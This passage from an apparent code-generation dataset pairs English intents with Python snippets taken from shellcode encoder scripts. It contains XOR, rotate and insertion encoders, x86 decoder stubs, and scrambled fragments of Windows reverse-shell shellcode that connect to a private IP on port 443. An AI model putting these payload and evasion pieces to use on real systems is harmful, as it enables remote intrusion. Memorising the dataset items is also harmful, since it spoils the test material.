[{"intent": "initialize bad_chars to the string '\\x0a\\x00\\x0d'", "rewritten_intent": "initialize bad_chars to the string '\\x0a\\x00\\x0d'", "snippet": "bad_chars = '\\x0a\\x00\\x0d'"},{"intent": "remove '\\\\x' from the second argument, decode it in hexadecimal, and save in bad_chars", "rewritten_intent": "remove '\\\\x' from the second argument, decode it in hexadecimal, and save in bad_chars", "snippet": "bad_chars = sys.argv[2].replace('\\\\x', '').decode('hex')"},{"intent": "break", "rewritten_intent": "break", "snippet": "break"},{"intent": "exit from the iteration", "rewritten_intent": "exit from the iteration", "snippet": "break"},{"intent": "break the cycle", "rewritten_intent": "break the cycle", "snippet": "break"},{"intent": "break the loop", "rewritten_intent": "break the loop", "snippet": "break"},{"intent": "add the bytes literal \"\\x02\\x00\\x01\\xbb\\x89\\xe6\\x6a\\x10\\x56\\x57\\x68\\x99\\xa5\" to the variable buf", "rewritten_intent": "add the bytes literal \"\\x02\\x00\\x01\\xbb\\x89\\xe6\\x6a\\x10\\x56\\x57\\x68\\x99\\xa5\" to the variable buf", "snippet": "buf += b\"\\x02\\x00\\x01\\xbb\\x89\\xe6\\x6a\\x10\\x56\\x57\\x68\\x99\\xa5\""},{"intent": "add the bytes literal \"\\x0d\\x01\\xc7\\xe2\\xf2\\x52\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\" to the variable buf", "rewritten_intent": "add the bytes literal \"\\x0d\\x01\\xc7\\xe2\\xf2\\x52\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\" to the variable buf", "snippet": "buf += b\"\\x0d\\x01\\xc7\\xe2\\xf2\\x52\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\""},{"intent": "add the bytes literal \"\\x4a\\x26\\x31\\xff\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\" to the variable buf", "rewritten_intent": "add the bytes literal \"\\x4a\\x26\\x31\\xff\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\" to the variable buf", "snippet": "buf += b\"\\x4a\\x26\\x31\\xff\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\""},{"intent": "add the bytes literal \"\\x50\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\" to the variable buf", "rewritten_intent": "add the bytes literal \"\\x50\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\" to the variable buf", "snippet": "buf += b\"\\x50\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\""},{"intent": "add the bytes literal \"\\x54\\x50\\x56\\x56\\x56\\x46\\x56\\x4e\\x56\\x56\\x53\\x56\\x68\" to the variable buf", "rewritten_intent": "add the bytes literal \"\\x54\\x50\\x56\\x56\\x56\\x46\\x56\\x4e\\x56\\x56\\x53\\x56\\x68\" to the variable buf", "snippet": "buf += b\"\\x54\\x50\\x56\\x56\\x56\\x46\\x56\\x4e\\x56\\x56\\x53\\x56\\x68\""},{"intent": "add the bytes literal \"\\x5f\\x5a\\x8b\\x12\\xeb\\x8d\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\" to the variable buf", "rewritten_intent": "add the bytes literal \"\\x5f\\x5a\\x8b\\x12\\xeb\\x8d\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\" to the variable buf", "snippet": "buf += b\"\\x5f\\x5a\\x8b\\x12\\xeb\\x8d\\x5d\\x68\\x33\\x32\\x00\\x00\\x68\""},{"intent": "add the bytes literal \"\\x68\\x08\\x87\\x1d\\x60\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x68\" to the variable buf", "rewritten_intent": "add the bytes literal \"\\x68\\x08\\x87\\x1d\\x60\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x68\" to the variable buf", "snippet": "buf += b\"\\x68\\x08\\x87\\x1d\\x60\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x68\""},{"intent": "add the bytes literal \"\\x68\\xf0\\xb5\\xa2\\x56\\xff\\xd5\\x68\\x63\\x6d\\x64\\x00\\x89\" to the variable buf", "rewritten_intent": "add the bytes literal \"\\x68\\xf0\\xb5\\xa2\\x56\\xff\\xd5\\x68\\x63\\x6d\\x64\\x00\\x89\" to the variable buf", "snippet": "buf += b\"\\x68\\xf0\\xb5\\xa2\\x56\\xff\\xd5\\x68\\x63\\x6d\\x64\\x00\\x89\""},{"intent": "add the bytes literal \"\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0c\\xff\\x4e\\x08\\x75\\xec\" to the variable buf", "rewritten_intent": "add the bytes literal \"\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0c\\xff\\x4e\\x08\\x75\\xec\" to the variable buf", "snippet": "buf += b\"\\x74\\x61\\xff\\xd5\\x85\\xc0\\x74\\x0c\\xff\\x4e\\x08\\x75\\xec\""},{"intent": "add the bytes literal \"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x53\\xff\\xd5\" to the variable buf", "rewritten_intent": "add the bytes literal \"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x53\\xff\\xd5\" to the variable buf", "snippet": "buf += b\"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x53\\xff\\xd5\""},{"intent": "add the bytes literal \"\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\\x07\\xff\\xd5\\xb8\" to the variable buf", "rewritten_intent": "add the bytes literal \"\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\\x07\\xff\\xd5\\xb8\" to the variable buf", "snippet": "buf += b\"\\x77\\x73\\x32\\x5f\\x54\\x68\\x4c\\x77\\x26\\x07\\xff\\xd5\\xb8\""},{"intent": "add the bytes literal \"\\x79\\xcc\\x3f\\x86\\xff\\xd5\\x89\\xe0\\x4e\\x56\\x46\\xff\\x30\" to the variable buf", "rewritten_intent": "add the bytes literal \"\\x79\\xcc\\x3f\\x86\\xff\\xd5\\x89\\xe0\\x4e\\x56\\x46\\xff\\x30\" to the variable buf", "snippet": "buf += b\"\\x79\\xcc\\x3f\\x86\\xff\\xd5\\x89\\xe0\\x4e\\x56\\x46\\xff\\x30\""},{"intent": "add the bytes literal \"\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f\" to the variable buf", "rewritten_intent": "add the bytes literal \"\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f\" to the variable buf", "snippet": "buf += b\"\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a\\x51\\xff\\xe0\\x5f\""},{"intent": "add the bytes literal \"\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\" to the variable buf", "rewritten_intent": "add the bytes literal \"\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\" to the variable buf", "snippet": "buf += b\"\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3\\x8b\\x04\\x8b\\x01\\xd0\""},{"intent": "add the bytes literal \"\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1\\x51\\x8b\\x59\\x20\\x01\" to the variable buf", "rewritten_intent": "add the bytes literal \"\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1\\x51\\x8b\\x59\\x20\\x01\" to the variable buf", "snippet": "buf += b\"\\x8b\\x4c\\x11\\x78\\xe3\\x48\\x01\\xd1\\x51\\x8b\\x59\\x20\\x01\""},{"intent": "add the bytes literal \"\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\\x29\\x80\\x6b\\x00\" to the variable buf", "rewritten_intent": "add the bytes literal \"\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\\x29\\x80\\x6b\\x00\" to the variable buf", "snippet": "buf += b\"\\x90\\x01\\x00\\x00\\x29\\xc4\\x54\\x50\\x68\\x29\\x80\\x6b\\x00\""},{"intent": "add the bytes literal \"\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\" to the variable buf", "rewritten_intent": "add the bytes literal \"\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\" to the variable buf", "snippet": "buf += b\"\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\""},{"intent": "add the bytes literal \"\\xc7\\x44\\x24\\x3c\\x01\\x01\\x8d\\x44\\x24\\x10\\xc6\\x00\\x44\" to the variable buf", "rewritten_intent": "add the bytes literal \"\\xc7\\x44\\x24\\x3c\\x01\\x01\\x8d\\x44\\x24\\x10\\xc6\\x00\\x44\" to the variable buf", "snippet": "buf += b\"\\xc7\\x44\\x24\\x3c\\x01\\x01\\x8d\\x44\\x24\\x10\\xc6\\x00\\x44\""},{"intent": "add the bytes literal \"\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\" to the variable buf", "rewritten_intent": "add the bytes literal \"\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\" to the variable buf", "snippet": "buf += b\"\\xd3\\x8b\\x49\\x18\\xe3\\x3a\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\""},{"intent": "add the bytes literal \"\\xdf\\xe0\\xff\\xd5\\x97\\x6a\\x05\\x68\\xc0\\xa8\\x74\\xc7\\x68\" to the variable buf", "rewritten_intent": "add the bytes literal \"\\xdf\\xe0\\xff\\xd5\\x97\\x6a\\x05\\x68\\xc0\\xa8\\x74\\xc7\\x68\" to the variable buf", "snippet": "buf += b\"\\xdf\\xe0\\xff\\xd5\\x97\\x6a\\x05\\x68\\xc0\\xa8\\x74\\xc7\\x68\""},{"intent": "add the bytes literal \"\\xe3\\x57\\x57\\x57\\x31\\xf6\\x6a\\x12\\x59\\x56\\xe2\\xfd\\x66\" to the variable buf", "rewritten_intent": "add the bytes literal \"\\xe3\\x57\\x57\\x57\\x31\\xf6\\x6a\\x12\\x59\\x56\\xe2\\xfd\\x66\" to the variable buf", "snippet": "buf += b\"\\xe3\\x57\\x57\\x57\\x31\\xf6\\x6a\\x12\\x59\\x56\\xe2\\xfd\\x66\""},{"intent": "add the bytes literal \"\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\" to the variable buf", "rewritten_intent": "add the bytes literal \"\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\" to the variable buf", "snippet": "buf += b\"\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58\\x8b\\x58\\x24\\x01\\xd3\\x66\""},{"intent": "add the bytes literal \"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\" to the variable buf", "rewritten_intent": "add the bytes literal \"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\" to the variable buf", "snippet": "buf += b\"\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\""},{"intent": "add the bytes literal \"\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03\\x7d\" to the variable buf", "rewritten_intent": "add the bytes literal \"\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03\\x7d\" to the variable buf", "snippet": "buf += b\"\\xff\\xac\\xc1\\xcf\\x0d\\x01\\xc7\\x38\\xe0\\x75\\xf6\\x03\\x7d\""},{"intent": "add the bytes literal \"\\xff\\xd5\\x50\\x50\\x50\\x50\\x40\\x50\\x40\\x50\\x68\\xea\\x0f\" to the variable buf", "rewritten_intent": "add the bytes literal \"\\xff\\xd5\\x50\\x50\\x50\\x50\\x40\\x50\\x40\\x50\\x68\\xea\\x0f\" to the variable buf", "snippet": "buf += b\"\\xff\\xd5\\x50\\x50\\x50\\x50\\x40\\x50\\x40\\x50\\x68\\xea\\x0f\""},{"intent": "Declare an empty bytes literal and store it in the variable buf", "rewritten_intent": "Declare an empty bytes literal and store it in the variable buf", "snippet": "buf = b\"\""},{"intent": "byte is the sum of y and ROT modulo 256", "rewritten_intent": "byte is the sum of y and ROT modulo 256", "snippet": "byte = (y + ROT)%256"},{"intent": "byte is byte xor XOR", "rewritten_intent": "byte is byte xor XOR", "snippet": "byte = byte ^ XOR"},{"intent": "byte is byte shifted left by nbits", "rewritten_intent": "byte is byte shifted left by nbits", "snippet": "byte = byte << nbits"},{"intent": "assign the first two elements of shellcode to chunk", "rewritten_intent": "assign the first two elements of shellcode to chunk", "snippet": "chunk = shellcode[0:2]"},{"intent": "add 1 to chunk_no", "rewritten_intent": "add 1 to chunk_no", "snippet": "chunk_no += 1"},{"intent": "chunk_no is integer 0", "rewritten_intent": "chunk_no is integer 0", "snippet": "chunk_no = 0"},{"intent": "increment count by 1", "rewritten_intent": "increment count by 1", "snippet": "count += 1"},{"intent": "count is integer 1", "rewritten_intent": "count is integer 1", "snippet": "count = 1"},{"intent": "increase counter by 1", "rewritten_intent": "increase counter by 1", "snippet": "counter += 1"},{"intent": "counter is an integer 0", "rewritten_intent": "counter is an integer 0", "snippet": "counter = 0"},{"intent": "cast the string hopcode to integer base 16 and save it into the variable Dec_hopcode", "rewritten_intent": "cast the string hopcode to integer base 16 and save it into the variable Dec_hopcode", "snippet": "Dec_hopcode = int(hopcode, 16)"},{"intent": "add the string value '\\\\x' to the variable decoded", "rewritten_intent": "add the string value '\\\\x' to the variable decoded", "snippet": "decoded += '\\\\x'"},{"intent": "Convert the variable x to a hexadecimal and store it in the variable decoded", "rewritten_intent": "Convert the variable x to a hexadecimal and store it in the variable decoded", "snippet": "decoded += '%02x' % x"},{"intent": "initialize an empty string variable called decoded", "rewritten_intent": "initialize an empty string variable called decoded", "snippet": "decoded = \"\""},{"intent": "Convert the variable x to a hexadecimal and add it to the variable decoded2 followed by ','", "rewritten_intent": "Convert the variable x to a hexadecimal and add it to the variable decoded2 followed by ','", "snippet": "decoded2 += '%02x,' % x"},{"intent": "add the string value '0x' to the variable decoded", "rewritten_intent": "add the string value '0x' to the variable decoded", "snippet": "decoded2 += '0x'"},{"intent": "initialize an empty string variable called decoded2", "rewritten_intent": "initialize an empty string variable called decoded2", "snippet": "decoded2 = \"\""},{"intent": "append '\\x02\\xeb\\xe4\\xe8\\xdc\\xff\\xff\\xff' to decoder_stub", "rewritten_intent": "append '\\x02\\xeb\\xe4\\xe8\\xdc\\xff\\xff\\xff' to decoder_stub", "snippet": "decoder_stub += '\\x02\\xeb\\xe4\\xe8\\xdc\\xff\\xff\\xff'"},{"intent": "concatenate the string '\\x1c\\x0f\\x88\\xdf\\x88\\xd0\\x30\\xd8' to decoder_stub", "rewritten_intent": "concatenate the string '\\x1c\\x0f\\x88\\xdf\\x88\\xd0\\x30\\xd8' to decoder_stub", "snippet": "decoder_stub += '\\x1c\\x0f\\x88\\xdf\\x88\\xd0\\x30\\xd8'"},{"intent": "append '\\x31\\xd8\\x66\\x89\\x07\\x41\\x8d\\x7f' to decoder_stub", "rewritten_intent": "append '\\x31\\xd8\\x66\\x89\\x07\\x41\\x8d\\x7f' to decoder_stub", "snippet": "decoder_stub += '\\x31\\xd8\\x66\\x89\\x07\\x41\\x8d\\x7f'"},{"intent": "append the string '\\x74\\x16\\x66\\x8b\\x44\\x0f\\x01\\x66' to decoder_stub", "rewritten_intent": "append the string '\\x74\\x16\\x66\\x8b\\x44\\x0f\\x01\\x66' to decoder_stub", "snippet": "decoder_stub += '\\x74\\x16\\x66\\x8b\\x44\\x0f\\x01\\x66'"},{"intent": "concatenate '\\xb2\\x45\\xeb\\x1f\\x5e\\x8d\\x3e\\x8a' to decoder_stub", "rewritten_intent": "concatenate '\\xb2\\x45\\xeb\\x1f\\x5e\\x8d\\x3e\\x8a' to decoder_stub", "snippet": "decoder_stub += '\\xb2\\x45\\xeb\\x1f\\x5e\\x8d\\x3e\\x8a'"},{"intent": "add the string \"\\x31\\xd2\\x5e\\xbf\\x90\\x90\\xaa\\xaa\" to the variable decoder_stub", "rewritten_intent": "add the string \"\\x31\\xd2\\x5e\\xbf\\x90\\x90\\xaa\\xaa\" to the variable decoder_stub", "snippet": "decoder_stub += \"\\x31\\xd2\\x5e\\xbf\\x90\\x90\\xaa\\xaa\""},{"intent": "add the string \"\\x3c\\x16\\x32\\x0c\\x16\\x32\\x2c\\x16\" to the variable decoder_stub", "rewritten_intent": "add the string \"\\x3c\\x16\\x32\\x0c\\x16\\x32\\x2c\\x16\" to the variable decoder_stub", "snippet": "decoder_stub += \"\\x3c\\x16\\x32\\x0c\\x16\\x32\\x2c\\x16\""},{"intent": "add the string \"\\x42\\x42\\x83\\xc0\\x04\\x75\\xc5\\xff\" to the variable decoder_stub", "rewritten_intent": "add the string \"\\x42\\x42\\x83\\xc0\\x04\\x75\\xc5\\xff\" to the variable decoder_stub", "snippet": "decoder_stub += \"\\x42\\x42\\x83\\xc0\\x04\\x75\\xc5\\xff\""},{"intent": "add the string \"\\x7c\\x04\\x02\\x88\\x5c\\x04\\x03\\x39\" to the variable decoder_stub", "rewritten_intent": "add the string \"\\x7c\\x04\\x02\\x88\\x5c\\x04\\x03\\x39\" to the variable decoder_stub", "snippet": "decoder_stub += \"\\x7c\\x04\\x02\\x88\\x5c\\x04\\x03\\x39\""},{"intent": "add the string \"\\x7c\\x16\\x05\\x74\\x0a\\x42\\x42\\x42\" to the variable decoder_stub", "rewritten_intent": "add the string \"\\x7c\\x16\\x05\\x74\\x0a\\x42\\x42\\x42\" to the variable decoder_stub", "snippet": "decoder_stub += \"\\x7c\\x16\\x05\\x74\\x0a\\x42\\x42\\x42\""},{"intent": "add the string \"\\x7f\\x83\\xec\\x7f\\x8a\\x5c\\x16\\x01\" to the variable decoder_stub", "rewritten_intent": "add the string \"\\x7f\\x83\\xec\\x7f\\x8a\\x5c\\x16\\x01\" to the variable decoder_stub", "snippet": "decoder_stub += \"\\x7f\\x83\\xec\\x7f\\x8a\\x5c\\x16\\x01\""},{"intent": "add the string \"\\x83\\xec\\x7f\\x83\\xec\\x7f\\x83\\xec\" to the variable decoder_stub", "rewritten_intent": "add the string \"\\x83\\xec\\x7f\\x83\\xec\\x7f\\x83\\xec\" to the variable decoder_stub", "snippet": "decoder_stub += \"\\x83\\xec\\x7f\\x83\\xec\\x7f\\x83\\xec\""},{"intent": "add the string \"\\x88\\x2c\\x04\\x88\\x4c\\x04\\x01\\x88\" to the variable decoder_stub", "rewritten_intent": "add the string \"\\x88\\x2c\\x04\\x88\\x4c\\x04\\x01\\x88\" to the variable decoder_stub", "snippet": "decoder_stub += \"\\x88\\x2c\\x04\\x88\\x4c\\x04\\x01\\x88\""},{"intent": "add the string \"\\x8a\\x6c\\x16\\x04\\x32\\x1c\\x16\\x32\" to the variable decoder_stub", "rewritten_intent": "add the string \"\\x8a\\x6c\\x16\\x04\\x32\\x1c\\x16\\x32\" to the variable decoder_stub", "snippet": "decoder_stub += \"\\x8a\\x6c\\x16\\x04\\x32\\x1c\\x16\\x32\""},{"intent": "add the string \"\\x8a\\x7c\\x16\\x02\\x8a\\x4c\\x16\\x03\" to the variable decoder_stub", "rewritten_intent": "add the string \"\\x8a\\x7c\\x16\\x02\\x8a\\x4c\\x16\\x03\" to the variable decoder_stub", "snippet": "decoder_stub += \"\\x8a\\x7c\\x16\\x02\\x8a\\x4c\\x16\\x03\""},{"intent": "add the string \"\\xe4\\xe8\\xa4\\xff\\xff\\xff\" to the variable decoder_stub", "rewritten_intent": "add the string \"\\xe4\\xe8\\xa4\\xff\\xff\\xff\" to the variable decoder_stub", "snippet": "decoder_stub += \"\\xe4\\xe8\\xa4\\xff\\xff\\xff\""},{"intent": "decoder_stub is the string '\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2'", "rewritten_intent": "decoder_stub is the string '\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2'", "snippet": "decoder_stub = '\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2'"},{"intent": "initialize the variable decoder_stub to \"\\xeb\\x57\\x31\\xc0\\x31\\xdb\\x31\\xc9\"", "rewritten_intent": "initialize the variable decoder_stub to \"\\xeb\\x57\\x31\\xc0\\x31\\xdb\\x31\\xc9\"", "snippet": "decoder_stub = \"\\xeb\\x57\\x31\\xc0\\x31\\xdb\\x31\\xc9\""},{"intent": "in decoder_stub replace '\\x45' with bytes object containing the value xor_byte packed according to the format string unsigned char", "rewritten_intent": "in decoder_stub replace '\\x45' with bytes object containing the value xor_byte packed according to the format string unsigned char", "snippet": "decoder_stub = decoder_stub.replace('\\x45', struct.pack('B', xor_byte))"},{"intent": "for each element in decoder_stub convert the element to an integer representing the unicode then convert it to a hexadecimal ignore slice at index 2 until the end and join separating each element by the string '\\\\x'", "rewritten_intent": "for each element in decoder_stub convert the element to an integer representing the unicode then convert it to a hexadecimal ignore slice at index 2 until the end and join separating each element by the string '\\\\x'", "snippet": "decoder_stub_hex = ''.join('\\\\x{}'.format(hex(ord(x))[2:]) for x in decoder_stub)"},{"intent": "define the function find_valid_xor_byte with input parameters bytes and bad_chars", "rewritten_intent": "define the function find_valid_xor_byte with input parameters bytes and bad_chars", "snippet": "def find_valid_xor_byte(bytes, bad_chars):"},{"intent": "define a method named mask that takes in n as a parameter", "rewritten_intent": "define a method named mask that takes in n as a parameter", "snippet": "def mask(n):"},{"intent": "define a method named rol with the parameters n, rotations, and width. Width has a default value of 8", "rewritten_intent": "define a method named rol with the parameters n, rotations, and width. Width has a default value of 8", "snippet": "def rol(n, rotations, width=8):"},{"intent": "define a method named ror with the parameters n, rotations, and width. Width has a default value of 8", "rewritten_intent": "define a method named ror with the parameters n, rotations, and width. Width has a default value of 8", "snippet": "def ror(n, rotations, width=8):"},{"intent": "else if xxx is equal to the string '0x0'", "rewritten_intent": "else if xxx is equal to the string '0x0'", "snippet": "elif xxx == '0x0':"},{"intent": "else", "rewritten_intent": "else", "snippet": "else:"},{"intent": "declare an else statement", "rewritten_intent": "declare an else statement", "snippet": "else:"},{"intent": "convert the value x in hexadecimal and append it to the string encode followed by ','", "rewritten_intent": "convert the value x in hexadecimal and append it to the string encode followed by ','", "snippet": "encode += '%02x,'%x"},{"intent": "append 0x to encode", "rewritten_intent": "append 0x to encode", "snippet": "encode += '0x'"},{"intent": "append 0xAA to encode", "rewritten_intent": "append 0xAA to encode", "snippet": "encode += '0xAA,'"},{"intent": "encode is an empty string", "rewritten_intent": "encode is an empty string", "snippet": "encode = \"\""},{"intent": "append string '\\\\x' to encoded", "rewritten_intent": "append string '\\\\x' to encoded", "snippet": "encoded += '\\\\x'"},{"intent": "append '\\\\x' to the string encoded", "rewritten_intent": "append '\\\\x' to the string encoded", "snippet": "encoded += '\\\\x'"},{"intent": "add the string value '\\\\x' to the variable encoded", "rewritten_intent": "add the string value '\\\\x' to the variable encoded", "snippet": "encoded += '\\\\x'"},{"intent": "append string '\\\\x' followed by the conversion in hex of 0xAA to the string encoded", "rewritten_intent": "append string '\\\\x' followed by the conversion in hex of 0xAA to the string encoded", "snippet": "encoded += '\\\\x%02x' % 0xAA"},{"intent": "Convert the variable rand to a hexadecimal and add it to the variable encoded", "rewritten_intent": "Convert the variable rand to a hexadecimal and add it to the variable encoded", "snippet": "encoded += '\\\\x%02x' % rand"},{"intent": "convert to hexadecimal a random integer between 1 and 169 and append it to the string encoded", "rewritten_intent": "convert to hexadecimal a random integer between 1 and 169 and append it to the string encoded", "snippet": "encoded += '\\\\x%02x' % random.randint(1,169)"},{"intent": "append string '\\\\xbb' to encoded", "rewritten_intent": "append string '\\\\xbb' to encoded", "snippet": "encoded += '\\\\xbb'"},{"intent": "append string '\\\\xcc' to encoded", "rewritten_intent": "append string '\\\\xcc' to encoded", "snippet": "encoded += '\\\\xcc'"},{"intent": "append to the string encoded the hexadecimal conversion of the and operation between h and 0xff", "rewritten_intent": "append to the string encoded the hexadecimal conversion of the and operation between h and 0xff", "snippet": "encoded += '%02x' % (h & 0xff)"},{"intent": "append to the string encoded the hexadecimal conversion of the and operation between x and 0xff", "rewritten_intent": "append to the string encoded the hexadecimal conversion of the and operation between x and 0xff", "snippet": "encoded += '%02x' % (x & 0xff)"},{"intent": "perform the and operation between y and 0xff, then convert the result in hexadecimal and append it to the string encoded", "rewritten_intent": "perform the and operation between y and 0xff, then convert the result in hexadecimal and append it to the string encoded", "snippet": "encoded += '%02x' % (y & 0xff)"},{"intent": "append the value x converted in hex to the string encoded", "rewritten_intent": "append the value x converted in hex to the string encoded", "snippet": "encoded += '%02x' % x"},{"intent": "Convert the variable x to a hexadecimal and add it to the variable encoded", "rewritten_intent": "Convert the variable x to a hexadecimal and add it to the variable encoded", "snippet": "encoded += '%02x' % x"},{"intent": "append the value y converted in hex to the string encoded", "rewritten_intent": "append the value y converted in hex to the string encoded", "snippet": "encoded += '%02x' % y"},{"intent": "Convert the value of y to hex and append it to the variable encoded", "rewritten_intent": "Convert the value of y to hex and append it to the variable encoded", "snippet": "encoded += '%02x' % y"},{"intent": "Convert the value of y to a hexadecimal then add it to the variable encoded", "rewritten_intent": "Convert the value of y to a hexadecimal then add it to the variable encoded", "snippet": "encoded += '%02x' % y"},{"intent": "append to the string encoded the value (7 - (256 -x)) converted to hexadecimal", "rewritten_intent": "append to the string encoded the value (7 - (256 -x)) converted to hexadecimal", "snippet": "encoded += '%02x' %(7 -(256 - x))"},{"intent": "convert (x+7) to hexadecimal and append it to the string encoded", "rewritten_intent": "convert (x+7) to hexadecimal and append it to the string encoded", "snippet": "encoded += '%02x'%(x+7)"},{"intent": "Convert the value of leader to hexadecimal, then slice it at the index of 2 and add its value to the variable encoded", "rewritten_intent": "Convert the value of leader to hexadecimal, then slice it at the index of 2 and add its value to the variable encoded", "snippet": "encoded += hex(leader)[2:]"},{"intent": "slice the variable insertByte at index 2 and add the value to the variable encoded", "rewritten_intent": "slice the variable insertByte at index 2 and add the value to the variable encoded", "snippet": "encoded += insertByte[2:]"},{"intent": "slice the variable xxx at index 2 and add the value to the variable encoded", "rewritten_intent": "slice the variable xxx at index 2 and add the value to the variable encoded", "snippet": "encoded += xxx[2:]"},{"intent": "set encoded to an empty string", "rewritten_intent": "set encoded to an empty string", "snippet": "encoded = ' '"},{"intent": "set encoded to the string '\\\\x'", "rewritten_intent": "set encoded to the string '\\\\x'", "snippet": "encoded = '\\\\x'"},{"intent": "encoded is a string \"\"", "rewritten_intent": "encoded is a string \"\"", "snippet": "encoded = \"\""},{"intent": "encoded is string \"\"", "rewritten_intent": "encoded is string \"\"", "snippet": "encoded = \"\""},{"intent": "encoded is an empty string", "rewritten_intent": "encoded is an empty string", "snippet": "encoded = \"\""},{"intent": "initialize an empty string variable called encoded", "rewritten_intent": "initialize an empty string variable called encoded", "snippet": "encoded = \"\""},{"intent": "encoded is the concatenation of the string \"\\\\x\", the hexadecimal value of the length of array of bytes of the variable shellcode and the string ','", "rewritten_intent": "encoded is the concatenation of the string \"\\\\x\", the hexadecimal value of the length of array of bytes of the variable shellcode and the string ','", "snippet": "encoded = \"\\\\x%02x,\" % len(bytearray(shellcode))"},{"intent": "encoded is an empty list", "rewritten_intent": "encoded is an empty list", "snippet": "encoded = []"},{"intent": "append end to encoded", "rewritten_intent": "append end to encoded", "snippet": "encoded = encoded + end"},{"intent": "encoded_instruction_in_hex is a string containing the hexadecimal conversion of rox_encoded_instruction", "rewritten_intent": "encoded_instruction_in_hex is a string containing the hexadecimal conversion of rox_encoded_instruction", "snippet": "encoded_instruction_in_hex = '%02x' % rox_encoded_instruction"},{"intent": "Convert the value of z bitwise and 0xff to a hexadecimal then add it to the variable encoded_nasm followed by ','", "rewritten_intent": "Convert the value of z bitwise and 0xff to a hexadecimal then add it to the variable encoded_nasm followed by ','", "snippet": "encoded_nasm += \"%02x,\" %(z & 0xff)"},{"intent": "add the string value '0x' to the variable encoded_nasm", "rewritten_intent": "add the string value '0x' to the variable encoded_nasm", "snippet": "encoded_nasm += \"0x\""},{"intent": "initialize the variable encoded_nasm to an empty string", "rewritten_intent": "initialize the variable encoded_nasm to an empty string", "snippet": "encoded_nasm = \"\""},{"intent": "append the hexadecimal conversion of byte followed by ', ' to the string encoded_shellcode", "rewritten_intent": "append the hexadecimal conversion of byte followed by ', ' to the string encoded_shellcode", "snippet": "encoded_shellcode += '%02x, ' %byte"},{"intent": "append the hexadecimal conversion of new followed by ', ' to the string encoded_shellcode", "rewritten_intent": "append the hexadecimal conversion of new followed by ', ' to the string encoded_shellcode", "snippet": "encoded_shellcode += '%02x, ' %new"},{"intent": "convert shift to hexadecimal and append it followed by ', ' to the string encoded_shellcode", "rewritten_intent": "convert shift to hexadecimal and append it followed by ', ' to the string encoded_shellcode", "snippet": "encoded_shellcode += '%02x, ' %shift"},{"intent": "convert xor in hexadecimal and append it followed by ', ' to the string encoded_shellcode", "rewritten_intent": "convert xor in hexadecimal and append it followed by ', ' to the string encoded_shellcode", "snippet": "encoded_shellcode += '%02x, ' %xor"},{"intent": "append '0x' to the string encoded_shellcode", "rewritten_intent": "append '0x' to the string encoded_shellcode", "snippet": "encoded_shellcode += 